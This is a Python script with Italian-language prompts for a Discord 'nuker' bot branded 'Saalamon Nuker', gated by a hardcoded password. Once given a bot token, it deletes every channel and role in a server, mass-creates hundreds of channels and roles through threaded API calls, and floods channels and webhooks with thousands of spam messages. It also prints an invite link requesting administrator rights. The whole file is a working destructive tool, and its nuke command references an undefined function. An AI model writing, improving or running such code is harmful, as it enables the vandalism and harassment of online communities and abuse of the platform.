from colorama import Fore, Style, init
from time import sleep
import msvcrt
# Initialize colorama
init()





def gradient_text(text, start_color, end_color):
    gradient_text = ""
    steps = len(text)
    for i, char in enumerate(text):
        # Calculate color mixing ratio
        mix_ratio = i / steps
        r = int((1 - mix_ratio) * start_color[0] + mix_ratio * end_color[0])
        g = int((1 - mix_ratio) * start_color[1] + mix_ratio * end_color[1])
        b = int((1 - mix_ratio) * start_color[2] + mix_ratio * end_color[2])
        gradient_text += f"\033[38;2;{r};{g};{b}m{char}"
    return gradient_text + Style.RESET_ALL


start_color = (128, 0, 128) 
end_color = (0, 255, 0)     

ascii_art = '''
 ________  ________  ________  ___       ________  _____ ______   ________  ________      
|\   ____\|\   __  \|\   __  \|\  \     |\   __  \|\   _ \  _   \|\   __  \|\   ___  \    
\ \  \___|\ \  \|\  \ \  \|\  \ \  \    \ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \\ \  \   
 \ \_____  \ \   __  \ \   __  \ \  \    \ \   __  \ \  \\|__| \  \ \  \\\  \ \  \\ \  \  
  \|____|\  \ \  \ \  \ \  \ \  \ \  \____\ \  \ \  \ \  \    \ \  \ \  \\\  \ \  \\ \  \ 
    ____\_\  \ \__\ \__\ \__\ \__\ \_______\ \__\ \__\ \__\    \ \__\ \_______\ \__\\ \__\
   |\_________\|__|\|__|\|__|\|__|\|_______|\|__|\|__|\|__|     \|__|\|_______|\|__| \|__|
 ______________  ___  ___  __    _______   ________                                       
|\   ___  \|\  \|\  \|\  \|\  \ |\  ___ \ |\   __  \                                      
\ \  \\ \  \ \  \\\  \ \  \/  /|\ \   __/|\ \  \|\  \                                     
 \ \  \\ \  \ \  \\\  \ \   ___  \ \  \_|/_\ \   _  _\                                    
  \ \  \\ \  \ \  \\\  \ \  \\ \  \ \  \_|\ \ \  \\  \|                                   
   \ \__\\ \__\ \_______\ \__\\ \__\ \_______\ \__\\ _\                                   
    \|__| \|__|\|_______|\|__| \|__|\|_______|\|__|\|__|                                                                                                    
'''


for line in ascii_art.splitlines():
    print(gradient_text(line, start_color, end_color))
    sleep(0.05)  # Optional: Add delay for smooth effect


def masked_input(prompt, color):
    print(color + prompt, end="", flush=True)
    input_str = ""
    while True:
        char = msvcrt.getch() 
        if char == b'\r': 
            break
        elif char == b'\x08':  
            if len(input_str) > 0:
                input_str = input_str[:-1]
                print("\b \b", end="", flush=True) 
        else:
            input_str += char.decode("utf-8")
            print("*", end="", flush=True) 
    print()  
    return input_str


key = "Saalamon"

# Use masked input for key input
keyinput = masked_input("Metti la chiave del tool qua:\n<SAALAMON> : ", Fore.GREEN)

if keyinput == key:
    print('''
------------------------------------------------------------------------------------------------------
          ''')
else:
    quit()

import sys, discord, requests, json, threading, random, asyncio,aiohttp, time
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back
from time import sleep
from datetime import datetime
import msvcrt

now = datetime.now()
ftime = now.strftime("%H:%M:%S")
 
session = requests.Session()
 



def masked_input(prompt, color):
    print(color + prompt, end="", flush=True)
    input_str = ""
    while True:
        char = msvcrt.getch()
        if char == b'\r': 
            break
        elif char == b'\x08':  
            if len(input_str) > 0:
                input_str = input_str[:-1]
                print("\b \b", end="", flush=True)
        else:
            input_str += char.decode("utf-8")
            print("*", end="", flush=True)
    print() 
    return input_str


token = masked_input("Token del Bot: ", Fore.MAGENTA)
prefix = input("Prefisso: ")
stats = 'aeco-premium'
chan = input("Nome Del Canale: ")
spamdata = input(" Nome Messaggi spam: ")
rol = input("Nome Ruoli spam: ")
webname = input("Nome Webhook spam: ")
amountss = 1000
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")
 
if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }
 
 
 
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(stats))
    print("""                                                                                                  
  .-')     ('-.       ('-.                 ('-.     _   .-')                     .-') _  
 ( OO ).  ( OO ).-.  ( OO ).-.            ( OO ).-.( '.( OO )_                  ( OO ) ) 
(_)---\_) / . --. /  / . --. / ,--.       / . --. / ,--.   ,--.).-'),-----. ,--./ ,--,'  
/    _ |  | \-.  \   | \-.  \  |  |.-')   | \-.  \  |   `.'   |( OO'  .-.  '|   \ |  |\  
\  :` `..-'-'  |  |.-'-'  |  | |  | OO ).-'-'  |  | |         |/   |  | |  ||    \|  | ) 
 '..`''.)\| |_.'  | \| |_.'  | |  |`-' | \| |_.'  | |  |'.'|  |\_) |  |\|  ||  .     |/  
.-._)   \ |  .-.  |  |  .-.  |(|  '---.'  |  .-.  | |  |   |  |  \ |  | |  ||  |\    |   
\       / |  | |  |  |  | |  | |      |   |  | |  | |  |   |  |   `'  '-'  '|  | \   |   
 `-----'  `--' `--'  `--' `--' `------'   `--' `--' `--'   `--'     `-----' `--'  `--'
https://discord.com/oauth2/authorize?client_id=1206082729649905714&permissions=8&scope=bot
""")
    print("Comandi - nuke, scc, sdc, sdr, scr, spam, swh")
    print(f"è online {bot.user.name}")
    print(f"Prefisso - {prefix}")

 
def logo():
    print(f"è online {bot.user.name}")
    print(f"Prefisso - {prefix}")
 
@bot.command()
async def scc(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def spc(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
           json=json
        )
    for i in range(500):
           threading.Thread(
             target=spc,
             args=(chan, )
           ).start()
 
@bot.command()
async def scr(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def scrr(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/roles",
           headers=headers,
           json=json
        )
    for i in range(250):
           threading.Thread(
             target=scrr,
             args=(chan, )
           ).start()
 
@bot.command()
async def sdr(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        await role.delete()
 
@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()
    def cc(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
    for i in range(250):
           for channel in list(ctx.guild.channels):   
               threading.Thread(
                    target=channel_delete,
                    args=(channel.id, )
               ).start()
    for i in range(250):
           threading.Thread(
             target=cc,
             args=(chan, )
           ).start()
 
@bot.command()
async def sdc(ctx):
    for channel in list(ctx.guild.channels):
        await channel.delete()
 
@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 1000
    for i in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)
 
@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 10000
    for i in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)
 
@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webname)
            for i in range(10000):   
                 await webhook.send(spamdata)
        except:
            print("Ratelimitato")
 
 
bot.run(token)
